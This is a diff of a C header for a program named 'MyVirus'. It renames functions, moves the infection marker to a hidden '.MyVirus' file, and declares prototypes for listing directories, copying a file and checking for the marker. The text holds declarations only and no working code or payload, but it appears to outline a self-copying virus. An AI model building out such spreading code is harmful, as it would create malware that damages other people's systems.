@@ -9,8 +9,9 @@
  #include <errno.h>
  #include <string.h>
  #include <sys/stat.h>
+ #include <libgen.h>
 
- #define MARKER "MyVirus.out"
+ #define MARKER ".MyVirus"
 
 // An element of a list of directories
  typedef struct Directory_ {
@@ -19,17 +20,17 @@
 
  } Directory;
 
- // Add an Directory Element in a list
+ // Add an Directory element in a list
  int addDirectory(Directory *list, Directory *elt);
 
  // Free each Directory element in a list
  int freeList(Directory *list);
 
  /* 
- * List all directories in the given path.
- * subdirectories are not listed.
+ * List all directories in the given path and add them into a list.
+ * Subdirectories are not included.
  */
- int listDirectories(Directory *list, char *path);
+ int buildList(Directory *list, char *path);
 
  /*
  * Copy a source file at a given destination
@@ -44,5 +45,6 @@
  /*
  * Check is the defined marker is present in the given directory
  */
- int checkMarker(char *dir);
+ int markerExists(char *dir);
+
 #endif /* UTILIS_H */
